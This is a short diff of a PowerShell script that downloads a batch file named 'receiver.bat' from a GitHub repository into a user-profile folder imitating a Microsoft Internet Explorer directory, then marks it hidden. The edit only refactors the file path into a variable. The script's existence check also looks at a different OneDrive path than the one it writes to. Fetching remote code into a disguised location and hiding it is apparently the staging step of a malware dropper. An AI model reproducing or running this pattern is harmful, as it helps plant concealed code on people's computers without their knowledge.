@@ -1,6 +1,7 @@
 try {
     # Download the batch file
-    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile '%USERPROFILE%\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat'
+    $path = "$env:USERPROFILE\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat"
+    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile $path
     Write-Host "Download completed."
 } catch {
     Write-Error "Failed to download file: $_"
@@ -9,7 +10,7 @@ try {
 try {
     # Hide the batch file if it exists
     if (Test-Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat') {
-        Set-ItemProperty -Path '%USERPROFILE%\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         Write-Host "File hidden."
     } else {
         Write-Error "File not found."
